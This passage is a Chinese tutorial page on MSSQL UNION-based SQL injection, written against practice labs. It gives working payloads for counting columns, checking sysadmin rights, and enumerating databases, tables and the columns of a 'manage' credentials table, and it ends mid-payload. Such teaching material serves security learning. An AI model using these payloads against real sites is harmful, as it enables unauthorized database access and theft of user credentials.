theme-doc-toc-mobile tocMobile_bxCs"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">本页总览</button></div><div class="theme-doc-markdown markdown"><header><h1>各种注入手法</h1></header><h2 class="anchor anchorWithStickyNavbar_LWe7" id="前情提要">前情提要<a href="#前情提要" class="hash-link" aria-label="前情提要的直接链接" title="前情提要的直接链接">​</a></h2>
<ol>
<li>
<p>漏洞环境可以使用<code>https://github.com/Larryxi/MSSQL-SQLi-Labs</code></p>
</li>
<li>
<p>或者网上找一些开放的靶场，比如 <code>https://www.mozhe.cn/bug/detail/SXlYMWZhSm15QzM1OGpyV21BR1p2QT09bW96aGUmozhe</code></p>
</li>
<li>
<p>大多数注入方法都与MYSQL注入篇相似，但是MSSQL比MYSQL相对权限要更大</p>
</li>
</ol>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="联合查询union注入">联合查询(UNION)注入<a href="#联合查询union注入" class="hash-link" aria-label="联合查询(UNION)注入的直接链接" title="联合查询(UNION)注入的直接链接">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="概念">概念<a href="#概念" class="hash-link" aria-label="概念的直接链接" title="概念的直接链接">​</a></h3>
<p>和Mysql可以说是一模一样，只是一些语句不同而已，如果可以操作SQL语句且有回显的情况下，就可以通过<code>union</code>构造语句返回直接返回结果。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="注意">注意<a href="#注意" class="hash-link" aria-label="注意的直接链接" title="注意的直接链接">​</a></h3>
<ol>
<li>union查询时，我们构造的select语句的字段数要和当前表的字段数相同才能联合查询，否则会抛出异常（可能是页面不会显示内容或者直接提示错误等）</li>
<li>若回显仅支持第一行数据的话，我们需要让union前边正常查询的语句返回的结果为空，才能让我们想要的数据展现出来；返回为空只需要让union前面的内容在数据库中查询不到结果即可</li>
<li><code>union</code>，<code>union all</code>区别<!-- -->
<ul>
<li><code>union</code>: 对两个结果集进行并集操作，不包括重复行，同时进行默认规则的排序</li>
<li><code>union all</code>: 对两个结果集进行并集操作，包括重复行，不进行排序</li>
</ul>
</li>
</ol>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="注入流程">注入流程<a href="#注入流程" class="hash-link" aria-label="注入流程的直接链接" title="注入流程的直接链接">​</a></h3>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="确认字段">确认字段<a href="#确认字段" class="hash-link" aria-label="确认字段的直接链接" title="确认字段的直接链接">​</a></h4>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">order</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">by</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">4</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">-- 页面正常</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">order</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">by</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">5</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">-- 页面不正常</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211222165606706" src="/assets/images/image-20211222165606706-f5b6504ebcef671722b517867056dbcc.png" width="2008" height="238" class="img_ev3q"></p>
<p>说明有4列字段</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="确认显位">确认显位<a href="#确认显位" class="hash-link" aria-label="确认显位的直接链接" title="确认显位的直接链接">​</a></h4>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">id</span><span class="token operator" style="color:#393A34">=</span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">union</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">all</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;1&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;2&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;3&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;4&#x27;</span><br></span></code></pre></div></div>
<p>加<code>-</code>是为了让<code>union</code>查询前部分无结果，以便显示后部分的查询结果</p>
<p>这里<code>1 2 3 4</code>都用单引号引起来，是因为如果直接用数字型的1 2 3 4，有些地方类型转换会出现错误，导致无法显示出来，所以建议用<code>&#x27;1&#x27;</code>或者<code>null</code></p>
<p>可以很明显的看出来显位是2和3</p>
<p><img decoding="async" loading="lazy" alt="image-20211222165900941" src="/assets/images/image-20211222165900941-ae384bca8e02f7d20d9a3cf2e95bd838.png" width="1962" height="366" class="img_ev3q"></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="查询数据">查询数据<a href="#查询数据" class="hash-link" aria-label="查询数据的直接链接" title="查询数据的直接链接">​</a></h4>
<ul>
<li><strong>查询是否是<code>sysadmin</code>，以及本地服务器名称</strong></li>
</ul>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">id</span><span class="token operator" style="color:#393A34">=</span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">union</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">all</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;1&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">str</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">is_srvrolemember</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;sysadmin&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">@</span><span class="token variable" style="color:#36acaa">@servername</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;4&#x27;</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211222171533649" src="/assets/images/image-20211222171533649-99b4b1eeeecc24f18836468f0b126afc.png" width="1964" height="402" class="img_ev3q"></p>
<ul>
<li><strong>查询当前数据库和数据库用户</strong></li>
</ul>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">union</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">all</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;1&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">db_name</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token keyword" style="color:#00009f">user</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;4&#x27;</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211222171938390" src="/assets/images/image-20211222171938390-999c641ce6d74a258785b6c1ad3a5a5e.png" width="1930" height="360" class="img_ev3q"></p>
<p>使用如下方法也可以查询当前数据库名</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">id</span><span class="token operator" style="color:#393A34">=</span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">union</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">all</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;1&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">catalog_name</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;3&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;4&#x27;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> information_schema</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">schemata</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211222174435121" src="/assets/images/image-20211222174435121-2a291d55fb5af3b839a31a2b47a6f978.png" width="2006" height="234" class="img_ev3q"></p>
<ul>
<li><strong>查询其他数据库</strong></li>
</ul>
<p>**第一种方法：**可以直接通过遍历<code>db_name(n)</code>中的n值来查询</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">id</span><span class="token operator" style="color:#393A34">=</span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">union</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">all</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;1&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">db_name</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">db_name</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;4&#x27;</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211222172038569" src="/assets/images/image-20211222172038569-c8c824aa837bb4671f74e3aa5a0f9f86.png" width="1916" height="356" class="img_ev3q"></p>
<p>**第二种方法：**也可以通过查询<code>master..sysdatabases</code>来获取数据库名</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">id</span><span class="token operator" style="color:#393A34">=</span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">union</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">all</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;1&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">name</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;3&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;4&#x27;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> master</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sysdatabases </span><span class="token comment" style="color:#999988;font-style:italic">-- master</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">id</span><span class="token operator" style="color:#393A34">=</span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">union</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">all</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;1&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">name</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;3&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;4&#x27;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> master</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sysdatabases </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> name </span><span class="token operator" style="color:#393A34">!=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;master&#x27;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">-- model</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">id</span><span class="token operator" style="color:#393A34">=</span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">union</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">all</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;1&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">name</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;3&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;4&#x27;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> master</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sysdatabases </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> name </span><span class="token operator" style="color:#393A34">not</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">in</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;master&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;model&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">-- mozhe_db_v2</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211222174311500" src="/assets/images/image-20211222174311500-2e223aa5be0d2112400fd623b71f9347.png" width="2028" height="236" class="img_ev3q"></p>
<ul>
<li><strong>查询数据库的表名</strong></li>
</ul>
<p>在获取了当前的数据库后，需要获取当前数据库的表，使用<code>current_database..sysobjects</code>(此时<code>current_database</code>为<code>mozhe_db_v2</code>，所以为<code>mozhe_db_v2..systobjects</code>)，条件为<code>U</code>（用户表）</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># 查当前数据库的第一个表(默认使用当前数据库)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">id</span><span class="token operator" style="color:#393A34">=</span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">union</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">all</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">top</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;1&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">name</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;3&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;4&#x27;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> sysobjects </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> xtype</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;u&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">id</span><span class="token operator" style="color:#393A34">=</span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">union</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">all</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">top</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;1&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">name</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;3&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;4&#x27;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> mozhe_db_v2</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sysobjects </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> xtype</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;u&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 查当前数据库的第二个表(默认使用当前数据库)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">id</span><span class="token operator" style="color:#393A34">=</span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">union</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">all</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">top</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;1&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">name</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;3&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;4&#x27;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> sysobjects </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> xtype</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;u&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">and</span><span class="token plain"> name </span><span class="token operator" style="color:#393A34">not</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">in</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;manage&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 查master数据库的第一个表</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">id</span><span class="token operator" style="color:#393A34">=</span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">union</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">all</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">top</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;1&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">name</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;3&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;4&#x27;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> master</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sysobjects </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> xtype</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;u&#x27;</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211223095106953" src="/assets/images/image-20211223095106953-ebc767568ff7fe675f62f4378884bc5c.png" width="1946" height="234" class="img_ev3q"></p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># 查当前数据库的第一个表(默认使用当前数据库)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">top</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> table_name </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> information_schema</span><span class="token punctuation" style="color:#393A34">.</span><span class="token keyword" style="color:#00009f">tables</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 查询master库第一个表名</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">top</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> table_name </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> master</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">information_schema</span><span class="token punctuation" style="color:#393A34">.</span><span class="token keyword" style="color:#00009f">tables</span><br></span></code></pre></div></div>
<p><strong>二者区别：</strong></p>
<ol>
<li><code>database.information_schema.tables</code>包含视图</li>
<li>而<code>database..sysobjects where xtype = &#x27;U&#x27;</code>只包含用户创建的表</li>
</ol>
<ul>
<li><strong>查询列名</strong></li>
</ul>
<p>现在已经知道了表名为<code>manage</code>，尝试查询列名</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># 支持跨库查询</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">union</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">all</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">top</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;1&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">name</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;3&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;4&#x27;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> syscolumns </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> id </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> id </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> sysobjects </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> name</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;manage&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">-- id</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">union</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">all</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">top</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;1&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">name</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;3&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;4&#x27;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> syscolumns </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> id </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> id </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> sysobjects </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> name</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;manage&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">and</span><span class="token plain"> name </span><span class="token operator" style="color:#393A34">!=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;id&#x27;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">-- username</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">union</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">all</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">top</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;1&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">name</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;3&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;4&#x27;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> syscolumns </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> id </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> id </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> sysobjects </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> name</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;manage&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">and</span><span class="token plain"> name </span><span class="token operator" style="color:#393A34">not</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">in</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;id&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;username&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token comment" 